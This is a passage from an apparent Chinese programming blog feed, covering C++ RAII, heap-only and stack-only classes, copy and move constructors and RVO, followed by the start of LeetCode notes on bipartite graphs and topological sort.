id="GC（Garbage-Collection）"><a href="#GC（Garbage-Collection）" class="headerlink" title="GC（Garbage Collection）"></a>GC（Garbage Collection）</h4><p>典型语言：<code>Java</code>、<code>C#</code>等</p><ul><li>GC管理的是内存：当对象不再被引用时，由运行时系统自动回收内存。</li><li>程序员不用写<code>delete</code>，减少内存泄漏、悬挂指针风险。</li><li>但GC：<ul><li>不适合同步、实时要求高的场景(停顿、不可控回收时机)。</li><li>只负责内存，不会自动关闭文件、释放锁、断开网络连接——这些仍需你写显式的<code>close()/dispose()</code>等。</li></ul></li></ul><p><strong>有些场景(高性能、实时系统等)不能依赖GC，需要程序员自己控制资源释放。</strong></p><h4 id="RAII-Resource-Acquisition-Is-Initialization）"><a href="#RAII-Resource-Acquisition-Is-Initialization）" class="headerlink" title="RAII(Resource Acquisition Is Initialization）"></a>RAII(Resource Acquisition Is Initialization）</h4><p>典型语言：C++</p><ul><li><p>核心思想：<br><strong>“获取资源 &#x3D; 构造对象；释放资源 &#x3D; 析构对象”。</strong></p></li><li><p>实现方式：</p><ul><li>在构造函数中获取资源(<code>new</code>、<code>fopen</code>、<code>lock</code>等)；</li><li>在析构函数中自动释放资源(<code>delete</code>、<code>fclose</code>、<code>unlock</code>等）；</li><li>利用<strong>作用域结束时自动调用析构函数</strong>来保证“用完必释放”，无论函数正常返回还是抛异常。</li></ul></li><li><p>优点：</p><ul><li>不需要GC，也不需要手动到处写<code>close()</code>，异常也不怕。</li><li>不仅可以管理“内存”，还可以管理“一切需要成对获取&#x2F;释放的资源”。</li></ul></li></ul><h2 id="一个有趣的问题：如何创建只能在堆-栈上申请空间的类？"><a href="#一个有趣的问题：如何创建只能在堆-栈上申请空间的类？" class="headerlink" title="一个有趣的问题：如何创建只能在堆&#x2F;栈上申请空间的类？"></a>一个有趣的问题：如何创建只能在堆&#x2F;栈上申请空间的类？</h2><h3 id="只在堆上创建"><a href="#只在堆上创建" class="headerlink" title="只在堆上创建"></a>只在堆上创建</h3><p>只在堆上创建，就是要避免出现<code>A a</code>这种情况，一个很简单的思路就是禁止外部直接调用构造&#x2F;析构，只能通过工厂函数在堆上创建。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HeapOnly</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> HeapOnly* <span class="title">create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">HeapOnly</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">destroy</span><span class="params">(HeapOnly* p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">HeapOnly</span>() = <span class="keyword">default</span>;      </span><br><span class="line">    ~<span class="built_in">HeapOnly</span>() = <span class="keyword">default</span>;    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> p = HeapOnly::<span class="built_in">create</span>();   </span><br><span class="line">    HeapOnly::<span class="built_in">destroy</span>(p);</span><br><span class="line">    <span class="comment">// HeapOnly p; // 编译错误：无法调用私有构造函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能在堆上创建的好处就是堆上空间大，如果你这个类占用内存很大强制在堆上创建的话不用担心栈溢出的问题。</p><h3 id="只在栈上创建"><a href="#只在栈上创建" class="headerlink" title="只在栈上创建"></a>只在栈上创建</h3><p>只在栈上创建，就是要避免出现<code>A* a = new A()</code>这种情况，一个很简单的思路就是禁止对该类型使用 <code>new</code>&#x2F;<code>delete</code>，只允许自动存储(<code>A a;</code>作为成员&#x2F;局部变量)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StackOnly</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">StackOnly</span>() = <span class="keyword">default</span>;</span><br><span class="line">    ~<span class="built_in">StackOnly</span>() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(std::<span class="type">size_t</span>)</span> </span>= <span class="keyword">delete</span>;</span><br><span class="line">    <span class="type">void</span>* <span class="keyword">operator</span> <span class="keyword">new</span>[](std::<span class="type">size_t</span>) = <span class="keyword">delete</span>;</span><br><span class="line">    <span class="function"><span class="type">void</span>  <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="type">void</span>*)</span> </span>= <span class="keyword">delete</span>;</span><br><span class="line">    <span class="type">void</span>  <span class="keyword">operator</span> <span class="keyword">delete</span>[](<span class="type">void</span>*) = <span class="keyword">delete</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StackOnly a;       </span><br><span class="line">    <span class="comment">// StackOnly* p = new StackOnly; // 编译错误：operator new 被 delete</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能在栈上创建好处当然就是反过来，并且栈上分配空间速度快于堆上分配空间，所以在栈上创建适用于小内存的类。</p><h2 id="拷贝构造函数"><a href="#拷贝构造函数" class="headerlink" title="拷贝构造函数"></a>拷贝构造函数</h2><p>用同类型的已有对象来初始化新对象时会调用拷贝构造函数(例如<code>A b = a;</code>)，这是由编译器在需要的时候自动调用的。</p><p>常见的触发场景：</p><ul><li>直接初始化：<code>A a; A b = a;</code></li><li>传值调用：<code>f(A a) &#123;&#125;; A b; f(b);</code></li><li>函数值返回：<code>A f() &#123; A a; return a; &#125;</code></li></ul><h3 id="默认拷贝构造函数"><a href="#默认拷贝构造函数" class="headerlink" title="默认拷贝构造函数"></a>默认拷贝构造函数</h3><ul><li>逐个成员初始化(member-wise initialization &#x2F; member-wise copy)，也就是对每个成员执行其拷贝构造或按位复制(对内置&#x2F;指针类型为浅拷贝)。</li><li>对于成员对象，拷贝过程是递归的(成员对象各自按其拷贝规则复制)。</li></ul><h3 id="何时需要自定义拷贝构造函数"><a href="#何时需要自定义拷贝构造函数" class="headerlink" title="何时需要自定义拷贝构造函数"></a>何时需要自定义拷贝构造函数</h3><p>如果类持有裸指针或资源，默认的浅拷贝可能导致双重释放等问题——此时需自定义拷贝构造(或实现拷贝&#x2F;移动语义、使用智能指针)。</p><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">string</span> &#123;</span><br><span class="line">    <span class="type">char</span>* p;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">string</span>(<span class="type">char</span>* str) &#123;</span><br><span class="line">        p = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(str) + <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">strcpy</span>(p, str);</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">string</span>() &#123; <span class="keyword">delete</span>[] p; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">s1</span><span class="params">(<span class="string">&quot;abcd&quot;</span>)</span></span>;</span><br><span class="line">string s2 = s1;</span><br></pre></td></tr></table></figure><p>因为没有定义拷贝构造函数，这里s2会进行默认拷贝构造(是浅拷贝，s2的值为s1指针值)。</p><p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post30/5d8fc775a327aa849396489571944bc0.png" alt="悬挂指针"></p><p>如图所示两个指针指向同一个字符串，当s1释放资源时s2就会成为悬挂指针。修改方案是将默认的浅拷贝自定义为深拷贝：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string::<span class="built_in">string</span>(<span class="type">const</span> string&amp; s) &#123;</span><br><span class="line">    p = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(s.p) + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(p, s.p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先重新分配空间，再依次复制。</p><p>注意的一点是默认拷贝构造函数是直接调用的成员对象的拷贝构造函数但是自定义拷贝构造函数是调用成员对象的默认构造函数然后再赋值，所以在一个类中要初始化为另一个类的成员对象需要放在初始化表里，在之前的成员初始化表里也提到过。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A 没有默认构造</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="built_in">A</span>(<span class="type">int</span> v) : <span class="built_in">x</span>(v) &#123;&#125;</span><br><span class="line">    <span class="built_in">A</span>(<span class="type">const</span> A&amp;) = <span class="keyword">default</span>;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">B_bad</span> &#123; </span><br><span class="line">    A a;</span><br><span class="line">    <span class="comment">// 不能编译，因为 A 没有默认构造，无法先默认构造再赋值</span></span><br><span class="line">    <span class="built_in">B_bad</span>(<span class="type">const</span> B_bad&amp; b) &#123; a = b.a; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">B_good</span> &#123;</span><br><span class="line">    A a;</span><br><span class="line">    <span class="comment">// 直接调用 A 的拷贝构造</span></span><br><span class="line">    <span class="built_in">B_good</span>(<span class="type">const</span> B_good&amp; b) : <span class="built_in">a</span>(b.a) &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="为什么使用const-T"><a href="#为什么使用const-T" class="headerlink" title="为什么使用const T&amp;"></a>为什么使用<code>const T&amp;</code></h3><ul><li><p>效率：<code>T&amp;</code>不会复制对象(避免昂贵的拷贝)，只传递引用且不使用<code>&amp;</code>来传递引用会导致递归。</p></li><li><p>通用性：<code>const T&amp;</code>可以绑定到左值和右值(临时对象)，所以既能接收已有对象也能接收临时结果。比如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数返回的是一个临时对象，使用T&amp;会报错</span></span><br><span class="line"><span class="function">string <span class="title">generate</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;test&quot;</span>); &#125;</span><br><span class="line">string s = <span class="built_in">generate</span>();</span><br></pre></td></tr></table></figure></li><li><p>安全性：<code>const</code>保证函数不能修改被引用的对象，表达意图并避免意外修改。</p></li></ul><h2 id="移动构造函数"><a href="#移动构造函数" class="headerlink" title="移动构造函数"></a>移动构造函数</h2><p>移动构造函数比拷贝构造函数更快，因为只是拷贝指针。</p><h3 id="右值引用"><a href="#右值引用" class="headerlink" title="右值引用"></a>右值引用</h3><p><strong>左值(l‑value)</strong>：有一个稳定的存储位置（地址），程序在之后还能通过这个名字再访问它。<br><strong>右值(r‑value)</strong>：只是一个计算结果，没有独立的持久存储位置，一般是临时值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span> + <span class="number">2</span>; <span class="comment">// a是左值，1+2是右值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;&#125;;</span><br><span class="line">A a = <span class="built_in">A</span>(); <span class="comment">// a是左值，A()是右值</span></span><br></pre></td></tr></table></figure><p>在C++中，非常量引用可以绑定到左值，常量引用可以绑定到左值或右值。这点已经在之前讲<code>const T&amp;</code>的时候讲过了。</p><p>右值引用可以绑定到右值，右值引用<code>T&amp;&amp;</code>来表示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setVal</span><span class="params">(<span class="type">int</span> v)</span> </span>&#123; val = v; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">A <span class="title">getA</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">A</span>(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>; <span class="type">int</span> &amp;ra = a; <span class="comment">// OK</span></span><br><span class="line">    <span class="type">const</span> A &amp;cra = <span class="built_in">getA</span>(); <span class="comment">// OK</span></span><br><span class="line">    A &amp;&amp;aa = <span class="built_in">getA</span>(); <span class="comment">// OK</span></span><br><span class="line">    aa.<span class="built_in">setVal</span>(<span class="number">2</span>); <span class="comment">// OK</span></span><br><span class="line">    cra.<span class="built_in">setVal</span>(<span class="number">2</span>); <span class="comment">// 错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="移动构造函数注意点"><a href="#移动构造函数注意点" class="headerlink" title="移动构造函数注意点"></a>移动构造函数注意点</h3><ul><li><p>要把参数的指针设置为<code>nullptr</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span> &#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int</span> *arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MyArray</span>() : <span class="built_in">size</span>(<span class="number">0</span>), <span class="built_in">arr</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">MyArray</span>(<span class="type">int</span> sz) : <span class="built_in">size</span>(sz), <span class="built_in">arr</span>(<span class="keyword">new</span> <span class="type">int</span>[sz]) &#123;&#125;</span><br><span class="line">    <span class="comment">// 拷贝构造函数</span></span><br><span class="line">    <span class="built_in">MyArray</span>(<span class="type">const</span> MyArray &amp;other) :</span><br><span class="line">        <span class="built_in">size</span>(other.size), <span class="built_in">arr</span>(<span class="keyword">new</span> <span class="type">int</span>[other.size]) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">                arr[i] = other.arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 移动构造函数</span></span><br><span class="line">    <span class="built_in">MyArray</span>(MyArray &amp;&amp;other) : </span><br><span class="line">        <span class="built_in">size</span>(other.size), <span class="built_in">arr</span>(other.arr) &#123;</span><br><span class="line">            other.arr = <span class="literal">nullptr</span>; <span class="comment">// 避免双重释放</span></span><br><span class="line">        &#125;</span><br><span class="line">    ~<span class="built_in">MyArray</span>() &#123; <span class="keyword">delete</span>[] arr; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>当输入的是一个右值时会优先匹配移动构造而不是拷贝构造，因为编译器会匹配更符合语义的构造函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MyArray a;</span><br><span class="line">MyArray b = a;          <span class="comment">// a 是左值，只能调用拷贝构 MyArray(const MyArray&amp;)</span></span><br><span class="line">MyArray c = <span class="built_in">MyArray</span>();  <span class="comment">// MyArray() 是右值，优先调用 MyArray(MyArray&amp;&amp;)</span></span><br><span class="line">MyArray d = std::<span class="built_in">move</span>(a); <span class="comment">// std::move(a) 是右值，也优先调用 MyArray(MyArray&amp;&amp;)</span></span><br></pre></td></tr></table></figure></li><li><p>使用移动构造函数的时候要注意一个坑：<strong>形参虽然是 <code>T&amp;&amp;</code>，但一旦有了名字，在函数体内它就是左值</strong>。如果想把它继续当右值传给别的函数，需要用 <code>std::move()</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">process</span><span class="params">(<span class="type">int</span>&amp;&amp; r)</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handle</span><span class="params">(<span class="type">int</span>&amp;&amp; rvalue)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// rvalue在这里是一个有名字的变量，因此是左值</span></span><br><span class="line">    <span class="comment">// process(rvalue); // 编译错误：需要右值</span></span><br><span class="line">    <span class="built_in">process</span>(std::<span class="built_in">move</span>(rvalue)); <span class="comment">// 正确：强制把rvalue当成右值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="RVO与NRVO"><a href="#RVO与NRVO" class="headerlink" title="RVO与NRVO"></a>RVO与NRVO</h2><p>理论上，函数按值返回局部对象时，需要一次(或两次)拷贝&#x2F;移动：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用之前定义过的MyArray</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">MyArray <span class="title">change_aw</span><span class="params">(<span class="type">const</span> MyArray &amp;other)</span> </span>&#123;</span><br><span class="line">    <span class="function">MyArray <span class="title">aw</span><span class="params">(other.get_size())</span></span>;</span><br><span class="line">    <span class="comment">// do something to change aw</span></span><br><span class="line">    <span class="keyword">return</span> aw;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">MyArray <span class="title">myArr</span><span class="params">(<span class="number">5</span>)</span></span>;</span><br><span class="line">    <span class="comment">// 创建一个新的MyArray对象(一般走移动/拷贝构造，或被RVO消掉)</span></span><br><span class="line">    MyArray myArr2 = <span class="built_in">change_aw</span>(myArr);</span><br><span class="line">    <span class="comment">// 编译错误：非const左值引用不能绑定右值</span></span><br><span class="line">    MyArray &amp;myArr2 = <span class="built_in">change_aw</span>(myArr);</span><br><span class="line">    <span class="comment">// 右值引用直接引用返回的临时对象本身，可继续修改/移动，该对象在此作用域结束时析构</span></span><br><span class="line">    MyArray &amp;&amp;myArr2 = <span class="built_in">change_aw</span>(myArr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RVO&#x2F;NRVO能直接在调用者那块内存上构造返回对象，从而<strong>连拷贝 &#x2F; 移动构造都省掉</strong>；<br>如果某些场景不能做RVO，才会退而求其次用移动构造(有<code>T(T&amp;&amp;)</code>时)或拷贝构造(有<code>T(const T&amp;)</code>时)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> OO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(十四): 图</title>
      <link href="/post/8566cdaf.html"/>
      <url>/post/8566cdaf.html</url>
      
        <content type="html"><![CDATA[<p>数据结构介绍：图通常分为有向(directed)或无向(undirected)，有循环(cyclic)或无循环(acyclic)，所有节点相连(connected)或不相连(disconnected)。树即是一个相连的无向无环图，而另一种很常见的图是有向无环图(Directed Acyclic Graph，DAG)。</p><ul><li>补充：图通常有两种表示方法。假设图中一共有n个节点、m条边。第一种表示方法是邻接矩阵(adjacency matrix)：我们可以建立一个n×n的矩阵G，如果第i个节点连向第j个节点，则G[i][j]&#x3D;1，反之为0；如果图是无向的，则这个矩阵一定是对称矩阵，即G[i][j]&#x3D;G[j][i]。第二种表示方法是邻接链表(adjacency list)：我们可以建立一个大小为n的数组，每个位置i储存一个数组或者链表，表示第i个节点连向的其它节点。邻接矩阵空间开销比邻接链表大，但是邻接链表不支持快速查找i和j是否相连，因此两种表示方法可以根据题目需要适当选择。除此之外，我们也可以直接用一个m×2的矩阵储存所有的边。</li></ul><h2 id="一、二分图"><a href="#一、二分图" class="headerlink" title="一、二分图"></a>一、二分图</h2><ul><li><p>算法解释：二分图算法也称为染色法，是一种广度优先搜索。如果可以用两种颜色对图中的节点进行着色，并且保证相邻的节点颜色不同，那么图为二分。</p></li><li><p>题目：<a href="https://leetcode.cn/problems/is-graph-bipartite">判断二分图</a><br>给定一个图，判断其是否可以二分。<br><img src="https://assets.leetcode.com/uploads/2020/10/21/bi2.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBipartite</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; graph)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = graph.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">color</span><span class="params">(n, <span class="number">0</span>)</span></span>; </span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> start = <span class="number">0</span>; start &lt; n; ++start) &#123;</span><br><span class="line">            <span class="keyword">if</span> (color[start] != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            color[start] = <span class="number">1</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(start);</span><br><span class="line">            <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                <span class="type">int</span> u = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> v : graph[u]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (color[v] == <span class="number">0</span>) &#123;</span><br><span class="line">                        color[v] = (color[u] == <span class="number">1</span> ? <span class="number">2</span> : <span class="number">1</span>);</span><br><span class="line">                        q.<span class="built_in">push</span>(v);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (color[v] == color[u])</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：首先使用广度优先搜索把所有相连的点都给标记上，这里有一个容易错的地方在于必须要遍历每一个点因为可能存在独立的点。</p></li></ul><h2 id="二、拓扑排序"><a href="#二、拓扑排序" class="headerlink" title="二、拓扑排序"></a>二、拓扑排序</h2><ul><li><p>算法解释：拓扑排序(topological sort)是一种常见的，对有向无环图排序的算法。给定有向无环图中的N个节点，我们把它们排序成一个线性序列；若原图中节点i指向节点j，则排序结果中i一定在j之前。拓扑排序的结果不是唯一的，只要满足以上条件即可。</p></li><li><p>题目：<a href="https://leetcode.cn/problems/course-schedule-ii">课程表 II</a><br>给定N个课程和这些课程的前置必修课，求可以一次性上完所有课的顺序。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findOrder</span><span class="params">(<span class="type">int</span> numCourses, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; prerequisites)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adjs</span>(numCourses);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">degrees</span><span class="params">(numCourses)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; v : prerequisites) &#123;</span><br><span class="line">            adjs[v[<span class="number">1</span>]].<span class="built_in">push_back</span>(v[<span class="number">0</span>]);</span><br><span class="line">            ++degrees[v[<span class="number">0</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numCourses; ++i)</span><br><span class="line">            <span class="keyword">if</span> (degrees[i] == <span class="number">0</span>) q.<span class="built_in">push</span>(i);</span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">while</span> (size--) &#123;</span><br><span class="line">                <span class="type">int</span> index = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                res.<span class="built_in">push_back</span>(index);</span><br><span class="line">                <span class="keyword">auto</span> &amp;adj = adjs[index];</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; it : adj) &#123;</span><br><span class="line">                    --degrees[it];</span><br><span class="line">                    <span class="keyword">if</span> (!degrees[it]) q.<span class="built_in">push</span>(it);</span><br><span class="line">                